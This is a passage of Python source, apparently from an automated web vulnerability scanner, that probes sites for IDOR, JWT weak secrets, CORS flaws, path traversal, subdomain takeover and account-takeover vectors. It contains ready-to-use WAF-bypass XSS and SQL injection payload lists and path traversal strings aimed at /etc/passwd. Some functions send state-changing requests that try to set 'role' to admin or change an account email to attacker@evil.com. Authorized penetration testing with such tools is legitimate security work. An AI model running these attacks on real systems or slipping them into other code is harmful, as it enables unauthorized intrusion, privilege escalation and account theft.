    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql", "/query"]:
            url = f"{base}{path}"
            try:
                # First check if endpoint exists
                r = _S.post(url, json={"query": "{__typename}"},
                           headers={"Content-Type": "application/json"}, timeout=5)
                if r.status_code not in (200, 400): continue

                # Check if introspection is disabled
                r_intro = _S.post(url, json={"query": "{__schema{types{name}}}"},
                                  headers={"Content-Type": "application/json"}, timeout=5)
                if "__schema" in r_intro.text:
                    continue  # Introspection enabled, already handled elsewhere

                # Probe field suggestions
                discovered = []
                for field in field_guesses:
                    r_probe = _S.post(url,
                                     json={"query": f"{{ {field} {{ id }} }}"},
                                     headers={"Content-Type": "application/json"},
                                     timeout=5)
                    body = r_probe.text
                    # "Did you mean X?" reveals real field names
                    suggestions = re.findall(r'[Dd]id you mean ["\']?(\w+)["\']?', body)
                    if suggestions:
                        discovered.extend(suggestions)
                    # Field exists if no "Cannot query field" error
                    if "Cannot query field" not in body and "Unknown field" not in body:
                        if r_probe.status_code == 200 and "errors" not in body.lower():
                            discovered.append(field)

                if discovered:
                    unique = list(set(discovered))
                    findings.append({
                        "type": "GraphQL Schema Enumeration (Field Suggestion)",
                        "severity": "medium",
                        "url": url,
                        "detail": f"Schema fields discovered without introspection: {', '.join(unique[:10])}",
                        "template": "apex-gql-enum",
                    })
            except: continue
    return findings


def scan_api_version_enumeration(web_targets):
    """Find all active API versions — old versions often lack security fixes."""
    findings = []
    versions = ["v0", "v1", "v2", "v3", "v4", "v5",
                "beta", "alpha", "legacy", "old", "dev", "internal",
                "2023", "2022", "2021", "2020"]
    sensitive_endpoints = [
        "users", "user/me", "me", "profile", "accounts", "admin",
        "config", "settings", "keys", "tokens", "payments", "cards",
    ]
    for target in web_targets[:3]:
        active_versions = []
        for ver in versions:
            for prefix in ["/api/", "/api/", "/"]:
                url = f"{target}{prefix}{ver}/users"
                try:
                    r = _S.get(url, timeout=3, allow_redirects=False)
                    if r.status_code in (200, 401, 403):
                        active_versions.append(f"{prefix}{ver}")
                        break
                except: continue

        if len(active_versions) > 1:
            # Multiple versions active — test each for unauth access
            for ver_path in active_versions:
                for ep in sensitive_endpoints[:5]:
                    url = f"{target}{ver_path}/{ep}"
                    try:
                        r = _S.get(url, timeout=3)
                        if r.status_code == 200:
                            try:
                                data = r.json()
                                if isinstance(data, (list, dict)) and len(str(data)) > 50:
                                    findings.append({
                                        "type": f"Unprotected API Version: {ver_path}/{ep}",
                                        "severity": "high",
                                        "url": url,
                                        "detail": f"API version {ver_path} exposes /{ep} without auth",
                                        "template": "apex-api-ver",
                                    })
                            except: pass
                    except: continue

        if len(active_versions) >= 2:
            findings.append({
                "type": f"Multiple API Versions Active",
                "severity": "medium",
                "url": target,
                "detail": f"Active versions: {', '.join(active_versions)} — old versions may lack security patches",
                "template": "apex-api-ver",
            })
    return findings


def scan_legacy_endpoints(target, subdomains):
    """Find legacy/forgotten endpoints via common patterns and historical naming."""
    findings = []
    base = f"https://{target}"
    legacy_paths = [
        # Old API versions
        "/api/v1/", "/api/v2/", "/api/old/", "/api/legacy/", "/api/beta/",
        # Old admin paths
        "/admin/", "/administrator/", "/wp-admin/", "/phpmyadmin/",
        "/adminer/", "/manager/", "/management/",
        # Dev/debug leftovers
        "/debug/", "/test/", "/dev/", "/staging/", "/demo/",
        "/console/", "/shell/", "/terminal/",
        # Config/backup files
        "/.env", "/.env.backup", "/.env.old", "/.env.prod",
        "/config.json", "/config.yml", "/config.yaml",
        "/app.config.js", "/settings.json",
        "/backup/", "/bak/", "/old/",
        # Framework specific
        "/actuator/", "/actuator/env", "/actuator/heapdump",
        "/telescope/", "/horizon/", "/nova/",
        "/_profiler/", "/_wdt/",
        # API docs
        "/swagger/", "/swagger-ui/", "/api-docs/",
        "/openapi.json", "/openapi.yaml",
        "/graphiql", "/playground",
        # Source maps
        "/main.js.map", "/app.js.map", "/bundle.js.map",
        "/static/js/main.chunk.js.map",
    ]
    try:
        r404 = _S.get(f"{base}/nonexistent_apex_xyz_test", timeout=3)
        size_404 = len(r404.content)
    except: return findings

    for path in legacy_paths:
        try:
            r = _S.get(f"{base}{path}", timeout=4, allow_redirects=False)
            if r.status_code == 200 and abs(len(r.content) - size_404) > 100:
                body = r.text[:300].lower()
                # Filter generic pages
                if any(x in body for x in ["<html", "<!doctype"]) and len(r.content) < 500:
                    continue
                sev = "critical" if any(x in path for x in [".env", "heapdump", "config"]) else "high"
                findings.append({
                    "type": f"Legacy/Forgotten Endpoint: {path}",
                    "severity": sev,
                    "url": f"{base}{path}",
                    "detail": f"Endpoint accessible ({r.status_code}, {len(r.content)}b)",
                    "template": "apex-legacy",
                })
        except: continue

    # Also check subdomains for legacy patterns
    for sub in subdomains[:10]:
        for proto in ["https", "http"]:
            for path in ["/.env", "/api/v1/users", "/admin", "/actuator/env"]:
                try:
                    r = _S.get(f"{proto}://{sub}{path}", timeout=3, allow_redirects=False)
                    if r.status_code == 200 and len(r.content) > 50:
                        findings.append({
                            "type": f"Legacy Endpoint on Subdomain: {sub}{path}",
                            "severity": "high",
                            "url": f"{proto}://{sub}{path}",
                            "detail": f"Sensitive path accessible on subdomain",
                            "template": "apex-legacy",
                        })
                        break
                except: continue
    return findings


def scan_idor_horizontal_vertical(crawl_data):
    """Test both horizontal IDOR (other users' data) and vertical IDOR (privilege escalation)."""
    findings = []
    # Find endpoints with numeric IDs or UUIDs
    id_pattern = re.compile(r'/(\d{1,10}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:/|$|\?)')

    tested_bases = set()
    for page in crawl_data.get("pages", []):
        url = page["url"]
        m = id_pattern.search(url)
        if not m: continue
        current_id = m.group(1)
        base_path = url[:m.start(1)]
        if base_path in tested_bases: continue
        tested_bases.add(base_path)

        is_uuid = "-" in current_id
        if is_uuid:
            # Can't easily enumerate UUIDs
            continue

        current_num = int(current_id)
        # Test adjacent IDs (horizontal IDOR)
        responses = {}
        for test_id in [1, 2, current_num - 1, current_num + 1, current_num + 100]:
            if test_id <= 0: continue
            test_url = url[:m.start(1)] + str(test_id) + url[m.end(1):]
            try:
                r = _S.get(test_url, timeout=5)
                if r.status_code == 200 and len(r.content) > 50:
                    responses[test_id] = r.text[:200]
            except: continue

        if len(set(responses.values())) > 1:
            findings.append({
                "type": "IDOR - Horizontal (Access Other Users' Data)",
                "severity": "high",
                "url": url,
                "detail": f"Different responses for IDs {list(responses.keys())} — user data accessible without ownership check",
                "template": "apex-idor-horiz",
            })

        # Vertical IDOR — try ID 0, -1, admin IDs
        for priv_id in [0, -1, 999999, 1000000]:
            test_url = url[:m.start(1)] + str(priv_id) + url[m.end(1):]
            try:
                r = _S.get(test_url, timeout=5)
                if r.status_code == 200 and len(r.content) > 100:
                    body = r.text.lower()
                    if any(x in body for x in ["admin", "root", "superuser", "system", "internal"]):
                        findings.append({
                            "type": "IDOR - Vertical (Privilege Escalation)",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"ID {priv_id} returns privileged data",
                            "template": "apex-idor-vert",
                        })
            except: continue

    return findings


# ---------------------------------------------------------------------------
# WAF bypass mode + tech-specific targeted scanners
# ---------------------------------------------------------------------------

_WAF_BYPASS_MODE = False

# WAF bypass XSS payloads (Cloudflare, Akamai, AWS WAF bypass encodings)
_WAF_BYPASS_XSS = [
    # Case variation
    "<ScRiPt>alert(1)</ScRiPt>",
    # HTML entities
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    # Unicode
    "<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>",
    # Double encoding
    "%253Cscript%253Ealert(1)%253C/script%253E",
    # Null bytes
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    # Comment injection
    "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
    # Backtick
    "<img src=`x` onerror=alert(1)>",
    # Newline bypass
    "<img\nsrc=x\nonerror=alert(1)>",
    # Tab bypass
    "<img\tsrc=x\tonerror=alert(1)>",
    # JS protocol variations
    "jaVaScRiPt:alert(1)",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    # Cloudflare specific bypasses
    "<details/open/ontoggle=alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    # AWS WAF bypass
    "';alert(String.fromCharCode(88,83,83))//",
    "\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7 onerror=eval(atob(this.id))>",
]

_WAF_BYPASS_SQLI = [
    # Space bypass
    "' OR/**/1=1--",
    "' OR%091=1--",
    "' OR\t1=1--",
    # Case bypass
    "' oR '1'='1",
    "' Or '1'='1",
    # Comment bypass
    "'/**/OR/**/1=1--",
    "' /*!OR*/ 1=1--",
    # Double encoding
    "%2527 OR 1=1--",
    # HPP bypass
    "1&id=2 UNION SELECT 1,2,3--",
    # Keyword bypass
    "' OORR '1'='1",
    "' || '1'='1",
    # MySQL specific
    "' OR 1=1 LIMIT 1 OFFSET 0--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    # Time-based with bypass
    "' AND SLEEP/**/( 4)--",
    "'; WAITFOR/**/ DELAY '0:0:4'--",
]


def get_xss_payloads():
    """Return XSS payloads — WAF bypass variants if WAF detected."""
    if _WAF_BYPASS_MODE:
        return _WAF_BYPASS_XSS + _XSS_PAYLOADS[:5]
    return _XSS_PAYLOADS


def get_sqli_payloads():
    """Return SQLi payloads — WAF bypass variants if WAF detected."""
    if _WAF_BYPASS_MODE:
        return _WAF_BYPASS_SQLI + SQLI_PAYLOADS[:10]
    return SQLI_PAYLOADS


def _run_wp_enum(apex_instance):
    """WordPress-specific: enumerate users, check xmlrpc, test wp-login brute."""
    import requests as _r
    base = apex_instance.web_targets[0] if apex_instance.web_targets else f"https://{apex_instance.target}"
    findings = []
    # User enumeration via REST API
    for path in ["/wp-json/wp/v2/users", "/?author=1", "/?author=2"]:
        try:
            r = _r.get(f"{base}{path}", timeout=5, verify=False)
            if r.status_code == 200:
                import json as _j
                try:
                    data = _j.loads(r.text)
                    if isinstance(data, list) and data:
                        users = [u.get("slug", u.get("name", "")) for u in data[:5]]
                        findings.append({
                            "type": "WordPress User Enumeration",
                            "severity": "medium",
                            "url": f"{base}{path}",
                            "detail": f"Users exposed: {', '.join(users)}",
                            "template": "apex-wp",
                        })
                except: pass
        except: pass
    # XML-RPC enabled
    try:
        r = _r.post(f"{base}/xmlrpc.php",
                   data="<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
                   timeout=5, verify=False)
        if r.status_code == 200 and "methodResponse" in r.text:
            findings.append({
                "type": "WordPress XML-RPC Enabled",
                "severity": "medium",
                "url": f"{base}/xmlrpc.php",
                "detail": "XML-RPC enabled — brute force and SSRF possible",
                "template": "apex-wp",
            })
    except: pass
    with apex_instance._vuln_lock:
        apex_instance.vulnerabilities.extend({**f, "status": "VULNERABLE"} for f in findings)


def _run_spring_deep(apex_instance):
    """Spring Boot: deep actuator scan for sensitive endpoints."""
    import requests as _r
    findings = []
    for target in (apex_instance.web_targets or [f"https://{apex_instance.target}"])[:3]:
        for path in ["/actuator/heapdump", "/actuator/env", "/actuator/beans",
                     "/actuator/mappings", "/actuator/httptrace", "/actuator/logfile",
                     "/actuator/threaddump", "/actuator/metrics"]:
            try:
                r = _r.get(f"{target}{path}", timeout=5, verify=False)
                if r.status_code == 200 and len(r.content) > 100:
                    sev = "critical" if "heapdump" in path else "high"
                    findings.append({
                        "type": f"Spring Actuator Exposed: {path}",
                        "severity": sev,
                        "url": f"{target}{path}",
                        "detail": f"Actuator endpoint accessible ({len(r.content)}b)",
                        "template": "apex-spring",
                    })
            except: pass
    with apex_instance._vuln_lock:
        apex_instance.vulnerabilities.extend({**f, "status": "VULNERABLE"} for f in findings)


def _run_laravel_secrets(apex_instance):
    """Laravel: check for .env, debug mode, telescope, horizon."""
    import requests as _r
    findings = []
    for target in (apex_instance.web_targets or [f"https://{apex_instance.target}"])[:3]:
        for path in ["/.env", "/storage/logs/laravel.log", "/telescope",
                     "/horizon", "/_ignition/health-check", "/api/documentation"]:
            try:
                r = _r.get(f"{target}{path}", timeout=5, verify=False)
                if r.status_code == 200 and len(r.content) > 50:
                    if "APP_KEY" in r.text or "DB_PASSWORD" in r.text:
                        findings.append({
                            "type": "Laravel .env Exposed",
                            "severity": "critical",
                            "url": f"{target}{path}",
                            "detail": "Laravel .env with secrets accessible",
                            "template": "apex-laravel",
                        })
                    elif "laravel.log" in path:
                        findings.append({
                            "type": "Laravel Log Exposed",
                            "severity": "high",
                            "url": f"{target}{path}",
                            "detail": f"Log file ({len(r.content)}b) accessible",
                            "template": "apex-laravel",
                        })
            except: pass
    with apex_instance._vuln_lock:
        apex_instance.vulnerabilities.extend({**f, "status": "VULNERABLE"} for f in findings)


# ---------------------------------------------------------------------------
# ELITE BATCH 10: JWT brute-force, CORS subdomain wildcard,
#                 BOPLA, API key in URL, insecure file download,
#                 mass assignment via PATCH, postMessage wildcard,
#                 prototype pollution via path, GraphQL subscription
# ---------------------------------------------------------------------------

_WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin", "test", "key",
    "jwt", "token", "auth", "changeme", "default", "pass", "1234",
    "secret123", "password123", "mysecret", "jwtkey", "supersecret",
    "your-256-bit-secret", "your-secret-key", "HS256", "HS512",
    "access_token_secret", "refresh_token_secret", "app_secret",
    "", "null", "undefined", "none",
]

def scan_jwt_secret_bruteforce(crawl_data):
    """Brute-force weak JWT secrets — if cracked, forge admin tokens."""
    import base64 as _b64, hmac as _hmac, hashlib as _hl, json as _j
    findings = []
    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')

    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            # Find JWTs in cookies, headers, body
            sources = list(r.cookies.values()) + [r.headers.get("Authorization",""),
                                                    r.headers.get("Set-Cookie",""), r.text[:3000]]
            for src in sources:
                for jwt in jwt_re.findall(str(src)):
                    parts = jwt.split(".")
                    if len(parts) != 3: continue
                    try:
                        pad = lambda s: s + "=" * (-len(s) % 4)
                        header = _j.loads(_b64.urlsafe_b64decode(pad(parts[0])))
                        alg = header.get("alg", "").upper()
                        if alg not in ("HS256", "HS384", "HS512"): continue
                        hash_fn = {"HS256": _hl.sha256, "HS384": _hl.sha384,
                                   "HS512": _hl.sha512}.get(alg, _hl.sha256)
                        msg = f"{parts[0]}.{parts[1]}".encode()
                        sig = _b64.urlsafe_b64decode(pad(parts[2]))
                        for secret in _WEAK_JWT_SECRETS:
                            expected = _hmac.new(secret.encode(), msg, hash_fn).digest()
                            if _hmac.compare_digest(expected, sig):
                                payload = _j.loads(_b64.urlsafe_b64decode(pad(parts[1])))
                                findings.append({
                                    "type": "JWT Weak Secret (Cracked)",
                                    "severity": "critical",
                                    "url": page["url"],
                                    "detail": f"JWT secret is '{secret}' — can forge tokens. Payload: {str(payload)[:100]}",
                                    "template": "apex-jwt-crack",
                                })
                                break
                    except: pass
        except: pass
    return findings


def scan_cors_subdomain_wildcard(crawl_data, subdomains):
    """CORS misconfiguration: wildcard subdomain allows attacker-controlled subdomains."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:10]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        host = urllib.parse.urlparse(base).netloc
        domain_parts = host.split(".")
        if len(domain_parts) < 2: continue
        tld = ".".join(domain_parts[-2:])
        # Test attacker-controlled subdomain
        attacker_origin = f"https://evil.{tld}"
        try:
            r = _S.get(page["url"], timeout=5, headers={"Origin": attacker_origin})
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == attacker_origin or (acao.endswith(tld) and "*" not in acao):
                sev = "critical" if acac.lower() == "true" else "high"
                findings.append({
                    "type": "CORS Subdomain Wildcard",
                    "severity": sev,
                    "url": page["url"],
                    "detail": f"Reflects subdomain origin {attacker_origin} — attacker can register evil.{tld}",
                    "template": "apex-cors-subdomain",
                })
        except: pass
        # Test null origin (sandboxed iframe)
        try:
            r = _S.get(page["url"], timeout=5, headers={"Origin": "null"})
            if r.headers.get("Access-Control-Allow-Origin") == "null":
                findings.append({
                    "type": "CORS Null Origin",
                    "severity": "high",
                    "url": page["url"],
                    "detail": "null origin accepted — sandboxed iframe attack possible",
                    "template": "apex-cors-null",
                })
        except: pass
    return findings


def scan_bopla(crawl_data):
    """Broken Object Property Level Authorization — set fields you shouldn't via PATCH/PUT."""
    findings = []
    priv_fields = {
        "role": "admin", "isAdmin": True, "admin": True, "verified": True,
        "active": True, "status": "active", "plan": "premium", "tier": "enterprise",
        "creditLimit": 999999, "balance": 999999, "permissions": ["admin"],
        "emailVerified": True, "phoneVerified": True, "kycVerified": True,
    }
    for page in crawl_data.get("pages", []):
        url = page["url"]
        # Look for user/profile/account endpoints
        if not any(x in url.lower() for x in ["user", "profile", "account", "me", "settings"]):
            continue
        base = "/".join(url.split("/", 3)[:3])
        for path in ["/api/me", "/api/user", "/api/profile", "/api/v1/me",
                     "/api/v1/user", "/api/account", "/user/profile"]:
            endpoint = f"{base}{path}"
            try:
                # Get baseline
                r_get = _S.get(endpoint, timeout=5)
                if r_get.status_code != 200: continue
                baseline = r_get.text
                # Try PATCH with privileged fields
                for field, value in list(priv_fields.items())[:5]:
                    r_patch = _S.request("PATCH", endpoint,
                                        json={field: value}, timeout=5,
                                        headers={"Content-Type": "application/json"})
                    if r_patch.status_code in (200, 204):
                        # Verify if field was actually set
                        r_verify = _S.get(endpoint, timeout=5)
                        if str(value).lower() in r_verify.text.lower() and str(value).lower() not in baseline.lower():
                            findings.append({
                                "type": f"BOPLA: Can Set '{field}' via PATCH",
                                "severity": "critical",
                                "url": endpoint,
                                "detail": f"PATCH {field}={value} accepted and persisted — privilege escalation",
                                "template": "apex-bopla",
                            })
                            break
            except: continue
    return findings


def scan_api_key_in_url(crawl_data):
    """Detect API keys passed as URL parameters — logged in server logs and Referer headers."""
    findings = []
    key_params = ("api_key", "apikey", "api-key", "key", "token", "access_token",
                  "auth_token", "secret", "client_secret", "app_key", "appkey",
                  "authorization", "bearer", "jwt", "session_token")
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() in key_params:
                # Check if the value looks like a real key (not a placeholder)
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                val = qs.get(p, [""])[0]
                if len(val) >= 16 and val not in ("YOUR_API_KEY", "API_KEY", "TOKEN", ""):
                    findings.append({
                        "type": f"API Key/Token in URL Parameter: {p}",
                        "severity": "high",
                        "url": url,
                        "detail": f"Param '{p}' contains credential in URL — logged in server logs and Referer headers",
                        "template": "apex-key-url",
                    })
    # Also check page URLs for tokens
    for page in crawl_data.get("pages", []):
        url = page["url"]
        for param in key_params:
            if f"{param}=" in url.lower():
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                for k, vals in qs.items():
                    if k.lower() == param and vals and len(vals[0]) >= 16:
                        findings.append({
                            "type": f"Credential in URL: {k}",
                            "severity": "high",
                            "url": url,
                            "detail": f"Token/key in URL parameter '{k}' — exposed in logs",
                            "template": "apex-key-url",
                        })
    return findings


def scan_insecure_file_download(crawl_data):
    """Path traversal via file download parameters."""
    findings = []
    file_params = ("file", "filename", "path", "filepath", "download", "attachment",
                   "doc", "document", "name", "resource", "asset", "f", "src")
    traversal_payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "C:\\Windows\\win.ini",
    ]
    markers = ["root:x:", "root:*:", "[fonts]", "daemon:", "[extensions]"]

    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in file_params: continue
            for payload in traversal_payloads[:3]:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(m in r.text for m in markers):
                        findings.append({
                            "type": "Path Traversal via File Download",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"File param '{p}' allows path traversal — reads /etc/passwd",
                            "template": "apex-file-traversal",
                        })
                        break
                except: continue

    # Also test download endpoints
    for page in crawl_data.get("pages", []):
        url = page["url"]
        if not any(x in url.lower() for x in ["download", "export", "file", "attachment"]):
            continue
        for payload in traversal_payloads[:2]:
            for p in ("file", "path", "name", "filename"):
                try:
                    test_url = f"{url}?{p}={urllib.parse.quote(payload)}"
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(m in r.text for m in markers):
                        findings.append({
                            "type": "Path Traversal in Download Endpoint",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"Download endpoint vulnerable to path traversal",
                            "template": "apex-file-traversal",
                        })
                        break
                except: continue
    return findings


def scan_prototype_pollution_path(crawl_data):
    """Prototype pollution via URL path segments — /api/__proto__/polluted."""
    findings = []
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        for path in ["/__proto__/polluted", "/constructor/prototype/polluted",
                     "/api/__proto__/test", "/api/constructor/prototype/test"]:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200:
                    body = r.text.lower()
                    if "polluted" in body or "prototype" in body:
                        findings.append({
                            "type": "Prototype Pollution via URL Path",
                            "severity": "high",
                            "url": f"{base}{path}",
                            "detail": "Server processes __proto__ in URL path — prototype pollution possible",
                            "template": "apex-pp-path",
                        })
            except: pass
    return findings


def scan_mass_assignment_patch(crawl_data):
    """Mass assignment via HTTP PATCH — often skips validation that POST has."""
    findings = []
    priv_fields = ["role", "admin", "isAdmin", "verified", "active", "plan",
                   "creditLimit", "balance", "permissions", "emailVerified"]
    for form in crawl_data.get("forms", []):
        action = form.get("action", "")
        if not action: continue
        method = form.get("method", "").upper()
        if method not in ("POST", "PUT"): continue
        inputs = form.get("inputs", [])
        try:
            baseline_data = {i.get("name","f"): i.get("value","test") for i in inputs}
            baseline = _S.post(action, json=baseline_data, timeout=5)
            # Try PATCH with extra privileged fields
            for field in priv_fields[:3]:
                patch_data = dict(baseline_data)
                patch_data[field] = "admin" if isinstance(field, str) else True
                r = _S.request("PATCH", action, json=patch_data, timeout=5,
                               headers={"Content-Type": "application/json"})
                if r.status_code in (200, 201, 204):
                    if r.text != baseline.text:
                        findings.append({
                            "type": f"Mass Assignment via PATCH: {field}",
                            "severity": "high",
                            "url": action,
                            "detail": f"PATCH accepts privileged field '{field}' — POST may not",
                            "template": "apex-mass-patch",
                        })
                        break
        except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 11: Account takeover vectors, OAuth deep testing,
#                 Subdomain takeover via CNAME services,
#                 HTTP request splitting, XXE via file upload,
#                 SSRF via URL redirect chains, GraphQL batching DoS
# ---------------------------------------------------------------------------

_TAKEOVER_FINGERPRINTS = {
    "github.io": ("There isn't a GitHub Pages site here", "GitHub Pages"),
    "s3.amazonaws.com": ("NoSuchBucket", "AWS S3"),
    "herokuapp.com": ("No such app", "Heroku"),
    "cloudfront.net": ("The request could not be satisfied", "CloudFront"),
    "bitbucket.io": ("Repository not found", "Bitbucket"),
    "shopify.com": ("Sorry, this shop is currently unavailable", "Shopify"),
    "surge.sh": ("project not found", "Surge.sh"),
    "fastly.net": ("Fastly error: unknown domain", "Fastly"),
    "ghost.io": ("The thing you were looking for is no longer here", "Ghost"),
    "pantheon.io": ("The gods are wise", "Pantheon"),
    "readme.io": ("Project doesnt exist", "Readme.io"),
    "statuspage.io": ("You are being redirected", "Statuspage"),
    "uservoice.com": ("This UserVoice subdomain is currently available", "UserVoice"),
    "zendesk.com": ("Help Center Closed", "Zendesk"),
    "wixsite.com": ("Error ConnectYourDomain", "Wix"),
    "wordpress.com": ("Do you want to register", "WordPress.com"),
    "tumblr.com": ("Whatever you were looking for doesn't currently exist", "Tumblr"),
    "azurewebsites.net": ("404 Web Site not found", "Azure"),
    "cloudapp.net": ("404 Web Site not found", "Azure"),
    "trafficmanager.net": ("404 Web Site not found", "Azure Traffic Manager"),
    "elasticbeanstalk.com": ("NoSuchBucket", "AWS Elastic Beanstalk"),
    "myshopify.com": ("Sorry, this shop is currently unavailable", "Shopify"),
    "netlify.app": ("Not Found", "Netlify"),
    "vercel.app": ("The deployment could not be found", "Vercel"),
    "fly.dev": ("404 Not Found", "Fly.io"),
    "render.com": ("Service not found", "Render"),
}

def scan_subdomain_takeover_deep(subdomains):
    """Deep subdomain takeover — checks 26 services, DNS CNAME validation."""
    if not subdomains:
        return []
    findings = []
    for sub in subdomains[:100]:
        for proto in ["https", "http"]:
            try:
                r = requests.get(f"{proto}://{sub}", timeout=6, verify=False,
                                allow_redirects=True)
                body = r.text
                for domain_hint, (sig, service) in _TAKEOVER_FINGERPRINTS.items():
                    if sig.lower() in body.lower():
                        findings.append({
                            "type": f"Subdomain Takeover: {service}",
                            "severity": "critical",
                            "url": f"{proto}://{sub}",
                            "detail": f"Dangling CNAME pointing to unclaimed {service} resource",
                            "template": "apex-takeover-deep",
                        })
                        break
                break
            except requests.exceptions.ConnectionError:
                # NXDOMAIN — check for dangling CNAME
                try:
                    result = subprocess.run(
                        ["dig", "+short", "CNAME", sub],
                        capture_output=True, text=True, timeout=5
                    )
                    cname = result.stdout.strip().rstrip(".")
                    if cname:
                        for domain_hint in _TAKEOVER_FINGERPRINTS:
                            if domain_hint in cname:
                                _, service = _TAKEOVER_FINGERPRINTS[domain_hint]
                                findings.append({
                                    "type": f"Subdomain Takeover (NXDOMAIN): {service}",
                                    "severity": "critical",
                                    "url": sub,
                                    "detail": f"CNAME {cname} → {service} but host unreachable",
                                    "template": "apex-takeover-deep",
                                })
                                break
                except Exception:
                    pass
                break
            except Exception:
                break
    return findings


def scan_account_takeover_vectors(crawl_data):
    """Test multiple ATO vectors: password reset flaws, email change, session fixation."""
    findings = []
    tested = set()

    for page in crawl_data.get("pages", []):
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)

        # 1. Password reset token predictability
        for path in ["/forgot-password", "/api/forgot-password", "/password/reset",
                     "/auth/forgot", "/api/auth/forgot-password"]:
            try:
                r1 = _S.post(f"{base}{path}", json={"email": "test1@test.com"}, timeout=5)
                r2 = _S.post(f"{base}{path}", json={"email": "test2@test.com"}, timeout=5)
                if r1.status_code in (200, 202) and r2.status_code in (200, 202):
                    # Check if tokens are in response (bad practice)
                    import re as _re
                    tokens1 = _re.findall(r'["\']?token["\']?\s*[:=]\s*["\']([^"\']{8,})["\']', r1.text)
                    tokens2 = _re.findall(r'["\']?token["\']?\s*[:=]\s*["\']([^"\']{8,})["\']', r2.text)
                    if tokens1 and tokens2:
                        # Check if tokens are sequential/predictable
                        if tokens1[0][:4] == tokens2[0][:4]:
                            findings.append({
                                "type": "Predictable Password Reset Token",
                                "severity": "critical",
                                "url": f"{base}{path}",
                                "detail": f"Reset tokens share prefix: {tokens1[0][:8]}... — may be predictable",
                                "template": "apex-ato",
                            })
                        else:
                            findings.append({
                                "type": "Password Reset Token in Response",
                                "severity": "high",
                                "url": f"{base}{path}",
                                "detail": "Reset token returned in API response — should only be sent via email",
                                "template": "apex-ato",
                            })
            except: continue

        # 2. Email change without password confirmation
        for path in ["/api/user/email", "/api/me/email", "/api/account/email",
                     "/api/v1/user/email", "/api/profile/email"]:
            try:
                r = _S.put(f"{base}{path}",
                           json={"email": "attacker@evil.com"},
                           timeout=5)
                if r.status_code in (200, 204):
                    findings.append({
                        "type": "Email Change Without Password Confirmation",
                        "severity": "high",
                        "url": f"{base}{path}",
                        "detail": "Email can be changed without current password — account takeover via email change",
                        "template": "apex-ato",
                    })
            except: continue

        # 3. Session fixation — server accepts pre-set session ID
        try:
            fixed_session = "apex_fixed_session_12345"
            r = _S.get(base, timeout=5,
                       headers={"Cookie": f"session={fixed_session}; sessionid={fixed_session}"})
            # Check if our fixed session ID is reflected/accepted
            set_cookie = r.headers.get("Set-Cookie", "")
            if fixed_session in set_cookie or fixed_session in r.text:
                findings.append({
                    "type": "Session Fixation",
                    "severity": "high",
                    "url": base,
                    "detail": "Server accepts and reflects pre-set session ID — session fixation possible",
                    "template": "apex-session-fix",
                })
        except: pass

    return findings


def scan_oauth_deep(crawl_data):
    """Deep OAuth testing: PKCE bypass, state fixation, token leakage via referrer."""
    findings = []
    tested = set()

    for page in crawl_data.get("pages", []):
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)

        oauth_paths = ["/oauth/authorize", "/oauth2/authorize", "/auth/oauth",
                       "/connect/authorize", "/login/oauth", "/.well-known/openid-configuration"]

        for path in oauth_paths:
            url = f"{base}{path}"
            try:
                r = _S.get(url, timeout=5, allow_redirects=False)
                if r.status_code not in (200, 302, 400, 401): continue

                # 1. Missing PKCE (code_challenge)
                auth_url = f"{url}?client_id=test&response_type=code&redirect_uri=https://example.com"
                r2 = _S.get(auth_url, timeout=5, allow_redirects=False)
                if r2.status_code in (200, 302):
                    loc = r2.headers.get("Location", "")
                    if "code=" in loc and "code_challenge" not in auth_url:
                        findings.append({
                            "type": "OAuth Missing PKCE",
                            "severity": "high",
                            "url": auth_url,
                            "detail": "Authorization code issued without PKCE — code interception attack possible",
